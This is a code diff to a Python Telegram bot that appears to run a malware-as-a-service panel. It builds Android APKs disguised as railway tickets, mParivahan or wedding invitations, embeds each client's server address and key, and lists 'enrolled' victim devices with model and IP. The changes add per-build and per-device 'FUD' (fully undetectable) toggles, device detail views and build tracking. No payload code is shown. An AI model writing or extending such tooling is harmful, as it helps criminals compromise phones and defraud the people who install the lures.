@@ -134,11 +134,11 @@ _current_tunnel_url = ""
 # ── Canonical templates (keep in sync with scripts/package_name_generator.py + build.yml) ──
 # wedding | shaadi | shaadi_hindi | mparivahan | railway | friends | bhabhi | custom
 TEMPLATES = {
+    "railway":      ("🚂", "Indian Railway Ticket"),
+    "mparivahan":   ("🚗", "mParivahan"),
     "wedding":      ("💍", "Wedding Invitation"),
     "shaadi":       ("💒", "Shaadi Ka Nimantran"),
     "shaadi_hindi": ("🙏", "शादी का निमंत्रण"),
-    "mparivahan":   ("🚗", "mParivahan"),
-    "railway":      ("🚂", "Indian Railway Ticket"),
     "friends":      ("👫", "Friends Club"),
     "bhabhi":       ("💃", "Fun with Bhabhi"),
     "custom":       ("⚙️",  "Custom"),
@@ -231,6 +231,7 @@ def init_db():
         ("server_key",         "TEXT DEFAULT ''"),
         ("custom_app_name",    "TEXT DEFAULT ''"),
         ("custom_icon_fid",    "TEXT DEFAULT ''"),
+        ("github_run_id",      "TEXT DEFAULT ''"),
     ]:
         try:
             db.execute(f"ALTER TABLE builds ADD COLUMN {col} {definition}")
@@ -245,6 +246,31 @@ def init_db():
         log.info("Migration: added clients.vpn_bypass")
     except Exception:
         pass  # column already exists
+
+    # ── Migration: devices table — device detail fields ───────────────────────
+    for col, defn in [
+        ("model",           "TEXT DEFAULT ''"),
+        ("manufacturer",    "TEXT DEFAULT ''"),
+        ("android_version", "TEXT DEFAULT ''"),
+        ("template",        "TEXT DEFAULT ''"),
+        ("enrolled_at",     "TEXT DEFAULT ''"),
+        ("fud_override",    "INTEGER DEFAULT -1"),
+    ]:
+        try:
+            db.execute(f"ALTER TABLE devices ADD COLUMN {col} {defn}")
+            db.commit()
+            log.info(f"Migration: added devices.{col}")
+        except Exception:
+            pass  # column already exists
+
+    # ── Migration: builds table — per-build FUD override ─────────────────────
+    try:
+        db.execute("ALTER TABLE builds ADD COLUMN fud_override INTEGER DEFAULT -1")
+        db.commit()
+        log.info("Migration: added builds.fud_override")
+    except Exception:
+        pass  # column already exists
+
     db.close()
     log.info("Database initialized")
 
@@ -255,6 +281,20 @@ def init_db():
 
 def utc_now() -> str:
     return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
+
+def resolve_fud(client_vpn_bypass: int,
+                build_fud_override: int = -1,
+                device_fud_override: int = -1) -> int:
+    """
+    3-level FUD resolution (most specific wins):
+      Device override  (-1 = inherit) → Build override (-1 = inherit) → Client default
+    Returns: 1 = FUD ON, 0 = FUD OFF
+    """
+    if device_fud_override != -1:
+        return device_fud_override
+    if build_fud_override != -1:
+        return build_fud_override
+    return int(client_vpn_bypass)
 
 
 def format_secs(secs: int) -> str:
@@ -1241,8 +1281,8 @@ def kb_builds_history(builds: list,
     return kb
 
 
-def kb_build_detail(build_id: int,
-                    client_id: int) -> types.InlineKeyboardMarkup:
+def kb_build_detail(build_id: int, client_id: int,
+                    fud_override: int = -1) -> types.InlineKeyboardMarkup:
     kb = types.InlineKeyboardMarkup(row_width=2)
     kb.add(
         types.InlineKeyboardButton(
@@ -1254,8 +1294,19 @@ def kb_build_detail(build_id: int,
             callback_data=f"rebuild_{build_id}"
         ),
     )
+    # FUD toggle: show current build-level override state
+    if fud_override == 1:
+        fud_label = "🛡 FUD: ON (this build)"
+    elif fud_override == 0:
+        fud_label = "🚫 FUD: OFF (this build)"
+    else:
+        fud_label = "🛡 FUD: Inherit (toggle)"
+    kb.add(types.InlineKeyboardButton(
+        fud_label, callback_data=f"toggle_build_fud_{build_id}"))
     kb.add(types.InlineKeyboardButton(
         "📥 Get APK", callback_data=f"get_apk_{build_id}"))
+    kb.add(types.InlineKeyboardButton(
+        "🗑 Delete Build", callback_data=f"delete_build_confirm_{build_id}_{client_id}"))
     kb.add(
         types.InlineKeyboardButton(
             "🔙 Back",
@@ -1266,8 +1317,8 @@ def kb_build_detail(build_id: int,
     return kb
 
 
-def kb_devices(build_id: int, page: int,
-               total_pages: int) -> types.InlineKeyboardMarkup:
+def kb_devices(build_id: int, page: int, total_pages: int,
+               devices: list = None) -> types.InlineKeyboardMarkup:
     kb    = types.InlineKeyboardMarkup(row_width=3)
     prev  = page - 1 if page > 1 else page
     nxt   = page + 1 if page < total_pages else page
@@ -1279,6 +1330,20 @@ def kb_devices(build_id: int, page: int,
         types.InlineKeyboardButton(
             "▶️ Next", callback_data=f"devices_{build_id}_{nxt}"),
     )
+    # Per-device detail buttons (one per device on this page)
+    if devices:
+        for d in devices:
+            mfr      = d.get("manufacturer") or ""
+            model    = d.get("model") or ""
+            dev_name = " ".join(filter(None, [mfr, model])) or d['device_id'][:10]
+            dev_fud  = d.get("fud_override", -1)
+            if dev_fud is None:
+                dev_fud = -1
+            fud_icon = "🛡" if int(dev_fud) == 1 else ("🚫" if int(dev_fud) == 0 else "📋")
+            kb.add(types.InlineKeyboardButton(
+                f"{fud_icon} {dev_name[:22]}",
+                callback_data=f"device_detail_{d['device_id']}"
+            ))
     kb.add(types.InlineKeyboardButton(
         "🔍 Search", callback_data=f"search_devices_{build_id}"))
     kb.add(
@@ -1540,14 +1605,19 @@ def text_client_detail(c: dict) -> str:
         st       = "✅" if last_build["status"] == "success" else "❌"
         last     = f"#{last_build['build_number']} {st} {emoji}"
 
-    fud_label = "🟢 ON" if c.get("vpn_bypass", 1) else "🔴 OFF"
+    fud_label    = "🟢 ON" if c.get("vpn_bypass", 1) else "🔴 OFF"
+    username_line = f"@{c['telegram_username']}" if c['telegram_username'] else "—"
+    profile_line  = c['profile_name'] if c['profile_name'] else "—"
     return (
         f"👤 <b>{name}</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
-        f"Username    : @{c['telegram_username']}\n"
+        f"Status      : {'🟢 Active' if c['active'] else '🔴 Inactive'}\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        f"Profile     : {profile_line}\n"
+        f"Username    : {username_line}\n"
         f"Telegram ID : <code>{c['telegram_id']}</code>\n"
         f"RDP IP      : <code>{c['rdp_ip']}</code>\n"
-        f"Status      : {'🟢 Active' if c['active'] else '🔴 Inactive'}\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
         f"FUD         : {fud_label}\n"
         f"Builds      : {builds}\n"
         f"Devices     : {devices}\n"
@@ -2245,18 +2315,40 @@ def text_build_detail(b: dict, client_name: str) -> str:
         "WHERE build_id=? AND status='active'",
         (b["id"],)).fetchone()["cnt"]
     db.close()
+
+    # Connection section — only show if at least IP is known
+    ip   = b.get("server_ip") or ""
+    port = b.get("server_port") or ""
+    key  = b.get("server_key") or ""
+    if ip:
+        conn_section = (
+            "━━━━━━━━━━━━━━━━━━━━\n"
+            "📡 <b>Connection</b>\n"
+            f"IP       : <code>{ip}</code>\n"
+            f"Port     : {port or '—'}\n"
+            f"Key      : <code>{key or '—'}</code>\n"
+        )
+    else:
+        conn_section = ""
+
+    date_str = b['started_at'][:16] if b.get('started_at') else '—'
+
     return (
         f"📋 <b>Build #{b['build_number']}</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
         f"Client   : {client_name}\n"
         f"Template : {emoji} {display_name}\n"
-        f"Package  : <code>{b['package_name'] or '—'}</code>\n"
-        f"Size     : {b['apk_size'] or '—'}\n"
-        f"Duration : {format_secs(b['duration_secs'])}\n"
         f"Status   : {status}\n"
-        f"Date     : {b['started_at'][:16] if b['started_at'] else '—'} UTC\n"
+        f"{conn_section}"
         "━━━━━━━━━━━━━━━━━━━━\n"
-        f"Devices  : {total_dev} total  |  {active_dev} active"
+        "📦 <b>APK Info</b>\n"
+        f"Package  : <code>{b.get('package_name') or '—'}</code>\n"
+        f"Size     : {b.get('apk_size') or '—'}\n"
+        f"Duration : {format_secs(b.get('duration_secs'))}\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        f"🕐 Date  : {date_str} UTC\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        f"📱 Devices : {total_dev} total  |  {active_dev} active"
     )
 
 
@@ -2270,13 +2362,35 @@ def text_devices(devices: list, build_num: int, template: str,
         f"Total : {total}  |  Page : {page}/{total_pages}",
         "━━━━━━━━━━━━━━━━━━━━",
     ]
-    for i, d in enumerate(
-            devices, (page - 1) * DEVICES_PER_PAGE + 1):
+    for i, d in enumerate(devices, (page - 1) * DEVICES_PER_PAGE + 1):
         se  = ("🟢" if d["status"] == "active"
                else "🟡" if d["status"] == "idle" else "🔴")
-        ago = time_ago(d["last_seen"])
+        ago      = time_ago(d["last_seen"])
+        mfr      = d.get("manufacturer") or ""
+        model    = d.get("model") or ""
+        android  = d.get("android_version") or ""
+        ip_addr  = d.get("ip") or "—"
+        # Enrolled date: enrolled_at stored as unix int or ISO string
+        raw_enr  = d.get("enrolled_at") or 0
+        try:
+            enr_ts   = int(raw_enr)
+            enr_str  = datetime.utcfromtimestamp(enr_ts).strftime("%Y-%m-%d") if enr_ts else "—"
+        except (ValueError, TypeError, OSError):
+            enr_str  = str(raw_enr)[:10] if raw_enr else "—"
+        # Device name line: "Samsung Galaxy S21 | Android 12"
+        dev_name = " ".join(filter(None, [mfr, model])) or d['device_id'][:12]
+        android_short = android.split(" (")[0] if android else "—"
+        # FUD override indicator
+        dev_fud  = d.get("fud_override", -1)
+        if dev_fud is None:
+            dev_fud = -1
+        fud_str  = "" if int(dev_fud) == -1 else (" 🛡" if int(dev_fud) == 1 else " 🚫")
         lines.append(
-            f"{i}. <code>{d['device_id'][:12]}...</code>  {se}  {ago}")
+            f"\n{i}. {se} <b>{dev_name}</b>{fud_str}\n"
+            f"   {android_short}  |  IP: {ip_addr}\n"
+            f"   Enrolled: {enr_str}  |  Seen: {ago}\n"
+            f"   <code>{d['device_id']}</code>"
+        )
     return "\n".join(lines)
 
 
@@ -2429,21 +2543,21 @@ def text_settings(chat_id: int) -> str:
 def text_add_client_form(data: dict, current_field: str,
                          error: str = "") -> str:
     # Step counter
-    step_map = {"username": 1, "name": 2, "tg_id": 3, "rdp_ip": 4}
+    step_map = {"name": 1, "tg_id": 2, "rdp_ip": 3, "username": 4}
     step = step_map.get(current_field, 1)
     total = 4
 
     fields = [
-        ("username", "Telegram Username",    data.get("username", ""), True),
-        ("name",     "Profile Name",         data.get("name", "") or "—", False),
-        ("tg_id",    "Telegram ID",          data.get("tg_id", ""),   True),
-        ("rdp_ip",   "RDP IP Address",       data.get("rdp_ip", ""),  True),
+        ("name",     "Profile Name",         data.get("name", "") or "—", True),
+        ("tg_id",    "Telegram ID",          data.get("tg_id", ""),        True),
+        ("rdp_ip",   "RDP IP Address",       data.get("rdp_ip", ""),       True),
+        ("username", "Telegram Username",    data.get("username", ""),     False),
     ]
     prompts = {
-        "username": "✏️ Send Telegram username (without @):",
-        "name":     "✏️ Send profile name, or send  .  to skip:",
+        "name":     "✏️ Send profile name (e.g. Txmod):",
         "tg_id":    "✏️ Send Telegram ID (numbers only):",
         "rdp_ip":   "✏️ Send RDP IP address (e.g. 192.168.1.1):",
+        "username": "✏️ Send Telegram username (without @), or send  .  to skip:",
     }
 
     lines = [
@@ -2616,10 +2730,11 @@ def show_build_detail(chat_id, message_id, build_id):
     c    = db.execute(
         "SELECT * FROM clients WHERE id=?", (b["client_id"],)).fetchone()
     db.close()
-    name = c["profile_name"] or c["telegram_username"] if c else "Unknown"
+    name         = c["profile_name"] or c["telegram_username"] if c else "Unknown"
+    fud_override = int(b["fud_override"]) if b["fud_override"] is not None else -1
     safe_edit(chat_id, message_id,
               text_build_detail(dict(b), name),
-              kb_build_detail(build_id, b["client_id"]))
+              kb_build_detail(build_id, b["client_id"], fud_override))
 
 
 def show_devices(chat_id, message_id, build_id, page):
@@ -2644,8 +2759,93 @@ def show_devices(chat_id, message_id, build_id, page):
         chat_id, message_id,
         text_devices(devices, b["build_number"], b["template"],
                      total, page, total_pages),
-        kb_devices(build_id, page, total_pages)
+        kb_devices(build_id, page, total_pages, devices)
     )
+
+
+def show_device_detail(chat_id, message_id, device_id: str):
+    db = get_db()
+    d  = db.execute(
+        "SELECT * FROM devices WHERE device_id=?", (device_id,)).fetchone()
+    if not d:
+        db.close()
+        safe_edit(chat_id, message_id, "❌ Device not found.", kb_home_only())
+        return
+    d = dict(d)
+    db.close()
+    mfr      = d.get("manufacturer") or "—"
+    model    = d.get("model") or "—"
+    android  = d.get("android_version") or "—"
+    template = d.get("template") or "—"
+    ip_addr  = d.get("ip") or "—"
+    raw_enr  = d.get("enrolled_at") or 0
+    try:
+        enr_ts  = int(raw_enr)
+        enr_str = datetime.utcfromtimestamp(enr_ts).strftime("%Y-%m-%d %H:%M") if enr_ts else "—"
+    except (ValueError, TypeError, OSError):
+        enr_str = str(raw_enr)[:16] if raw_enr else "—"
+    se       = ("🟢" if d["status"] == "active"
+                else "🟡" if d["status"] == "idle" else "🔴")
+    ago      = time_ago(d["last_seen"])
+    dev_fud  = d.get("fud_override", -1)
+    if dev_fud is None:
+        dev_fud = -1
+    dev_fud  = int(dev_fud)
+    if dev_fud == 1:
+        fud_label = "🛡 FUD: ON (this device)"
+        fud_btn   = f"🚫 Turn FUD OFF (this device)"
+    elif dev_fud == 0:
+        fud_label = "🚫 FUD: OFF (this device)"
+        fud_btn   = f"🛡 Turn FUD ON (this device)"
+    else:
+        fud_label = "📋 FUD: Inherit from build"
+        fud_btn   = f"🛡 Override FUD ON  |  🚫 Override FUD OFF"
+    build_id = d.get("build_id", 0)
+    text = (
+        f"📱 <b>Device Detail</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        f"Status    : {se} {d['status'].capitalize()}\n"
+        f"Maker     : {mfr}\n"
+        f"Model     : {model}\n"
+        f"Android   : {android}\n"
+        f"Template  : {template}\n"
+        f"IP        : {ip_addr}\n"
+        f"Enrolled  : {enr_str} UTC\n"
+        f"Last Seen : {ago}\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        f"FUD       : {fud_label}\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        f"<code>{device_id}</code>"
+    )
+    kb = types.InlineKeyboardMarkup(row_width=1)
+    if dev_fud == -1:
+        # Inherit — offer both ON and OFF overrides
+        kb.add(types.InlineKeyboardButton(
+            "🛡 Override FUD ON (this device)",
+            callback_data=f"toggle_device_fud_{device_id}_1"))
+        kb.add(types.InlineKeyboardButton(
+            "🚫 Override FUD OFF (this device)",
+            callback_data=f"toggle_device_fud_{device_id}_0"))
+    elif dev_fud == 1:
+        kb.add(types.InlineKeyboardButton(
+            "🚫 Turn FUD OFF (this device)",
+            callback_data=f"toggle_device_fud_{device_id}_0"))
+        kb.add(types.InlineKeyboardButton(
+            "↩️ Reset to Inherit",
+            callback_data=f"toggle_device_fud_{device_id}_-1"))
+    else:
+        kb.add(types.InlineKeyboardButton(
+            "🛡 Turn FUD ON (this device)",
+            callback_data=f"toggle_device_fud_{device_id}_1"))
+        kb.add(types.InlineKeyboardButton(
+            "↩️ Reset to Inherit",
+            callback_data=f"toggle_device_fud_{device_id}_-1"))
+    kb.add(
+        types.InlineKeyboardButton(
+            "🔙 Back", callback_data=f"devices_{build_id}_1"),
+        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
+    )
+    safe_edit(chat_id, message_id, text, kb)
 
 
 def show_client_stats(chat_id, message_id, client_id):
@@ -4075,26 +4275,12 @@ def handle_add_client_input(message):
     data   = buf.get("data", {})
     error  = ""
 
-    if field == "username":
-        clean = text.lstrip("@").strip()
-        if not clean:
-            error = "Username cannot be empty."
+    if field == "name":
+        if not text.strip():
+            error = "Profile name cannot be empty."
         else:
-            # Duplicate check
-            db = get_db()
-            existing = db.execute(
-                "SELECT id FROM clients WHERE telegram_username=?",
-                (clean,)).fetchone()
-            db.close()
-            if existing:
-                error = f"Client @{clean} already exists."
-            else:
-                data["username"] = clean
-                buf["field"]     = "name"
-
-    elif field == "name":
-        data["name"]  = "" if text == "." else text.strip()
-        buf["field"]  = "tg_id"
+            data["name"] = text.strip()
+            buf["field"] = "tg_id"
 
     elif field == "tg_id":
         if not text.strip().lstrip("-").isdigit():
@@ -4110,7 +4296,27 @@ def handle_add_client_input(message):
             error = "Invalid IP format. Example: 192.168.1.100"
         else:
             data["rdp_ip"] = text.strip()
-            buf["field"]   = "confirm"
+            buf["field"]   = "username"
+
+    elif field == "username":
+        clean = text.lstrip("@").strip()
+        if text.strip() == ".":
+            data["username"] = ""
+            buf["field"]     = "confirm"
+        elif not clean:
+            error = "Send a username or send  .  to skip."
+        else:
+            # Duplicate check
+            db = get_db()
+            existing = db.execute(
+                "SELECT id FROM clients WHERE telegram_username=?",
+                (clean,)).fetchone()
+            db.close()
+            if existing:
+                error = f"Client @{clean} already exists."
+            else:
+                data["username"] = clean
+                buf["field"]     = "confirm"
 
     buf["data"]              = data
     add_client_buf[chat_id]  = buf
@@ -4355,11 +4561,11 @@ def handle_callback(call):
         safe_edit(chat_id, msg_id, text_prod_menu(), kb_build())
 
     elif data == "add_client":
-        add_client_buf[str(chat_id)] = {"field": "username", "data": {}}
+        add_client_buf[str(chat_id)] = {"field": "name", "data": {}}
         nav_state[str(chat_id)] = {"screen": "add_client",
                                    "message_id": msg_id}
         safe_edit(chat_id, msg_id,
-                  text_add_client_form({}, "username"),
+                  text_add_client_form({}, "name"),
                   kb_add_client_cancel())
 
     elif data.startswith("client_") and not data.startswith("client_stats_"):
@@ -4897,7 +5103,7 @@ def handle_callback(call):
             "SELECT profile_name, telegram_username, rdp_ip, token, vpn_bypass FROM clients WHERE id=?",
             (client_id,)).fetchone()
         _lb = _db.execute(
-            "SELECT server_ip, server_port, server_key FROM builds "
+            "SELECT server_ip, server_port, server_key, fud_override FROM builds "
             "WHERE client_id=? AND template=? AND server_ip != '' "
             "ORDER BY id DESC LIMIT 1",
             (client_id, template)).fetchone()
@@ -4905,7 +5111,11 @@ def handle_callback(call):
         _client_name  = (_c["profile_name"] or _c["telegram_username"]) if _c else ""
         _client_ip    = _c["rdp_ip"] if _c else ""
         _client_token = _c["token"] if _c else "manual"
-        _fud_status   = str(int(_c["vpn_bypass"])) if _c and "vpn_bypass" in _c.keys() else "1"
+        _build_fud    = int(_lb["fud_override"]) if _lb and "fud_override" in _lb.keys() and _lb["fud_override"] is not None else -1
+        _fud_status   = str(resolve_fud(
+            client_vpn_bypass   = int(_c["vpn_bypass"]) if _c and "vpn_bypass" in _c.keys() else 1,
+            build_fud_override  = _build_fud,
+        ))
         _ip   = (_lb["server_ip"]   if _lb and _lb["server_ip"]   else _client_ip)
         _port = (_lb["server_port"] if _lb and _lb["server_port"] else "")
         _key  = (_lb["server_key"]  if _lb and _lb["server_key"]  else "")
@@ -4953,9 +5163,20 @@ def handle_callback(call):
             )
             _db2.commit()
             _db2.close()
-            run_id = prod_get_latest_run_id("build.yml", "dev", max_wait=12)
+            run_id = prod_get_latest_run_id("build.yml", "main", max_wait=12)
             if run_id:
                 prod_active_run[str(chat_id)] = run_id
+                # Also persist run_id to DB so monitor can match after bot restart
+                try:
+                    _db3 = get_db()
+                    _db3.execute(
+                        "UPDATE builds SET github_run_id=? WHERE chat_id=? AND status='building'",
+                        (str(run_id), str(chat_id))
+                    )
+                    _db3.commit()
+                    _db3.close()
+                except Exception:
+                    pass
                 _rb_host_label = "🌐 Domain" if _ip and "." in _ip and not _ip.replace(".", "").isdigit() else "📡 IP    "
                 safe_edit(chat_id, msg_id,
                           f"🔨 <b>Rebuilding: {emoji} {display_name}</b>\n"
@@ -5031,7 +5252,11 @@ def handle_callback(call):
         _key       = _brow["server_key"]  or ""
         _cname     = (_cl["profile_name"] or _cl["telegram_username"]) if _cl else ""
         _ctoken    = _cl["token"] if _cl else "manual"
-        _fud       = str(int(_cl["vpn_bypass"])) if _cl and "vpn_bypass" in _cl.keys() else "1"
+        _bfud      = int(_brow["fud_override"]) if _brow and "fud_override" in _brow.keys() and _brow["fud_override"] is not None else -1
+        _fud       = str(resolve_fud(
+            client_vpn_bypass   = int(_cl["vpn_bypass"]) if _cl and "vpn_bypass" in _cl.keys() else 1,
+            build_fud_override  = _bfud,
+        ))
         srv_host_b64 = _b64cb.b64encode(_ip.encode()).decode()    if _ip    else ""
         srv_port_b64 = _b64cb.b64encode(_port.encode()).decode() if _port  else ""
         srv_key_b64  = _b64cb.b64encode(_key.encode()).decode()  if _key   else ""
@@ -5074,9 +5299,19 @@ def handle_callback(call):
             )
             _db2.commit()
             _db2.close()
-            run_id = prod_get_latest_run_id("build.yml", "dev", max_wait=12)
+            run_id = prod_get_latest_run_id("build.yml", "main", max_wait=12)
             if run_id:
                 prod_active_run[str(chat_id)] = run_id
+                try:
+                    _db3b = get_db()
+                    _db3b.execute(
+                        "UPDATE builds SET github_run_id=? WHERE chat_id=? AND status='building'",
+                        (str(run_id), str(chat_id))
+                    )
+                    _db3b.commit()
+                    _db3b.close()
+                except Exception:
+                    pass
                 _crb_host_label = "🌐 Domain" if _ip and "." in _ip and not _ip.replace(".", "").isdigit() else "📡 IP    "
                 safe_edit(chat_id, msg_id,
                           f"🔨 <b>Rebuilding: ⚙️ {_app_name}</b>\n"
@@ -5262,7 +5497,9 @@ def handle_callback(call):
         # (domain OR IP). Never fall back to rdp_ip which is always a raw IP.
         _client_ip    = sbuf["ip"] if sbuf and sbuf.get("ip") else (_cl["rdp_ip"] if _cl else "")
         _client_token = _cl["token"] if _cl else "manual"
-        _fud_status   = str(int(_cl["vpn_bypass"])) if _cl and "vpn_bypass" in _cl.keys() else "1"
+        _fud_status   = str(resolve_fud(
+            client_vpn_bypass = int(_cl["vpn_bypass"]) if _cl and "vpn_bypass" in _cl.keys() else 1,
+        ))
         # Determine app_name: custom > template display name
         _app_name     = custom_app_name if custom_app_name else display_name
         # Port from server config buffer
@@ -5302,9 +5539,19 @@ def handle_callback(call):
             db.commit()
             db.close()
             # ── Fetch run_id so Cancel Build works ────────────────────────────
-            run_id = prod_get_latest_run_id("build.yml", "dev", max_wait=12)
+            run_id = prod_get_latest_run_id("build.yml", "main", max_wait=12)
             if run_id:
                 prod_active_run[str(chat_id)] = run_id
+                try:
+                    _db3c = get_db()
+                    _db3c.execute(
+                        "UPDATE builds SET github_run_id=? WHERE chat_id=? AND status='building'",
+                        (str(run_id), str(chat_id))
+                    )
+                    _db3c.commit()
+                    _db3c.close()
+                except Exception:
+                    pass
                 # Update message to show Cancel button
                 if template == "custom" and custom_app_name:
                     _emoji, _name = "⚙️", custom_app_name
@@ -5341,6 +5588,36 @@ def handle_callback(call):
     elif data.startswith("builds_history_"):
         show_builds_history(chat_id, msg_id, int(data.split("_")[2]))
 
+    elif data.startswith("delete_build_confirm_"):
+        parts    = data.split("_")
+        build_id  = int(parts[3])
+        client_id = int(parts[4])
+        kb = types.InlineKeyboardMarkup(row_width=2)
+        kb.add(
+            types.InlineKeyboardButton("✅ Yes, Delete", callback_data=f"delete_build_do_{build_id}_{client_id}"),
+            types.InlineKeyboardButton("❌ Cancel",      callback_data=f"build_detail_{build_id}"),
+        )
+        safe_edit(chat_id, msg_id,
+                  "🗑 <b>Delete Build?</b>\n"
+                  "━━━━━━━━━━━━━━━━━━━━\n"
+                  "This will permanently delete this build record and all its devices.\n"
+                  "Are you sure?",
+                  kb)
+
+    elif data.startswith("delete_build_do_"):
+        parts     = data.split("_")
+        build_id  = int(parts[3])
+        client_id = int(parts[4])
+        try:
+            db = get_db()
+            db.execute("DELETE FROM devices WHERE build_id=?", (build_id,))
+            db.execute("DELETE FROM builds WHERE id=?", (build_id,))
+            db.commit()
+            db.close()
+            show_builds_history(chat_id, msg_id, client_id)
+        except Exception as e:
+            safe_edit(chat_id, msg_id, f"❌ Delete failed: {e}", None)
+
     elif data.startswith("build_detail_"):
         show_build_detail(chat_id, msg_id, int(data.split("_")[2]))
 
@@ -5349,6 +5626,47 @@ def handle_callback(call):
         build_id = int(parts[1])
         page     = int(parts[2])
         show_devices(chat_id, msg_id, build_id, page)
+
+    elif data.startswith("device_detail_"):
+        device_id = data[len("device_detail_"):]
+        show_device_detail(chat_id, msg_id, device_id)
+
+    elif data.startswith("toggle_build_fud_"):
+        build_id = int(data[len("toggle_build_fud_"):])
+        db       = get_db()
+        b        = db.execute(
+            "SELECT * FROM builds WHERE id=?", (build_id,)).fetchone()
+        if b:
+            cur = int(b["fud_override"]) if b["fud_override"] is not None else -1
+            # Cycle: -1 (inherit) → 1 (ON) → 0 (OFF) → -1
+            if cur == -1:
+                new_val = 1
+            elif cur == 1:
+                new_val = 0
+            else:
+                new_val = -1
+            db.execute(
+                "UPDATE builds SET fud_override=? WHERE id=?",
+                (new_val, build_id))
+            db.commit()
+        db.close()
+        show_build_detail(chat_id, msg_id, build_id)
+
+    elif data.startswith("toggle_device_fud_"):
+        # Format: toggle_device_fud_{device_id}_{value}
+        # value: 1, 0, or -1
+        rest     = data[len("toggle_device_fud_"):]
+        # device_id contains no underscores in format, but to be safe split from right
+        parts    = rest.rsplit("_", 1)
+        device_id = parts[0]
+        new_val   = int(parts[1])
+        db        = get_db()
+        db.execute(
+            "UPDATE devices SET fud_override=? WHERE device_id=?",
+            (new_val, device_id))
+        db.commit()
+        db.close()
+        show_device_detail(chat_id, msg_id, device_id)
 
     elif data.startswith("client_stats_"):
         show_client_stats(chat_id, msg_id, int(data.split("_")[2]))
@@ -7646,7 +7964,7 @@ def prod_build_monitor_loop():
     while True:
         try:
             r = requests.get(
-                f"{GH_REPO()}/actions/runs?branch=dev&per_page=1",
+                f"{GH_REPO()}/actions/workflows/build.yml/runs?per_page=1",
                 headers=GH_HDR(), timeout=15)
             if r.status_code != 200:
                 time.sleep(180)
@@ -7664,6 +7982,82 @@ def prod_build_monitor_loop():
             if run_id != _last_seen_run_id:
                 _last_seen_run_id = run_id
                 _rollback_alerted = False
+
+            # ── Update build_number + status in DB when a client build completes ─
+            if status == "completed" and run_id:
+                import datetime as _dt
+                _finished = _dt.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
+                _final_status = "success" if conclusion == "success" else "failed"
+                # Check if already processed this run_id
+                try:
+                    _chk = get_db()
+                    _already = _chk.execute(
+                        "SELECT id FROM builds WHERE github_run_id=? AND status!=?",
+                        (str(run_id), "building")).fetchone()
+                    _chk.close()
+                    if _already:
+                        time.sleep(180)
+                        continue
+                except Exception:
+                    pass
+                # Match by github_run_id in DB (survives bot restarts)
+                _matched_chat = None
+                try:
+                    _fb = get_db()
+                    _row = _fb.execute(
+                        "SELECT chat_id FROM builds WHERE github_run_id=? AND status='building' LIMIT 1",
+                        (str(run_id),)
+                    ).fetchone()
+                    _fb.close()
+                    if _row:
+                        _matched_chat = str(_row[0])
+                        log_w.info(f"Matched chat {_matched_chat} by github_run_id {run_id}")
+                except Exception as _fe:
+                    log_w.error(f"github_run_id lookup failed: {_fe}")
+                # Fallback: in-memory map
+                if not _matched_chat:
+                    for _cid, _rid in list(prod_active_run.items()):
+                        if str(_rid) == str(run_id):
+                            _matched_chat = _cid
+                            break
+                # Last resort: any building row (single-client scenario)
+                if not _matched_chat:
+                    try:
+                        _fb2 = get_db()
+                        _row2 = _fb2.execute(
+                            "SELECT chat_id FROM builds WHERE status='building' ORDER BY id DESC LIMIT 1"
+                        ).fetchone()
+                        _fb2.close()
+                        if _row2:
+                            _matched_chat = str(_row2[0])
+                            log_w.info(f"Last-resort fallback matched chat {_matched_chat} from DB")
+                    except Exception as _fe2:
+                        log_w.error(f"Last-resort chat lookup failed: {_fe2}")
+                if _matched_chat:
+                    try:
+                        # Always fetch the specific run to get per-workflow run_number
+                        _run_resp = requests.get(
+                            f"{GH_REPO()}/actions/runs/{run_id}",
+                            headers=GH_HDR(), timeout=15)
+                        if _run_resp.status_code == 200:
+                            _run_number = _run_resp.json().get("run_number")
+                        else:
+                            _run_number = None
+                        if _run_number:
+                            _dbu = get_db()
+                            _dbu.execute(
+                                "UPDATE builds SET build_number=?, status=?, finished_at=?, github_run_id=? "
+                                "WHERE chat_id=? AND status='building'",
+                                (_run_number, _final_status, _finished, str(run_id), str(_matched_chat))
+                            )
+                            _dbu.commit()
+                            _dbu.close()
+                            prod_active_run.pop(_matched_chat, None)
+                            log_w.info(f"Build #{_run_number} → {_final_status} saved to DB (chat {_matched_chat})")
+                        else:
+                            log_w.error(f"Could not fetch run_number for run_id {run_id}")
+                    except Exception as _e:
+                        log_w.error(f"DB update build_number failed: {_e}")
 
             # Alert only once per failed run
             if (status == "completed" and conclusion == "failure"
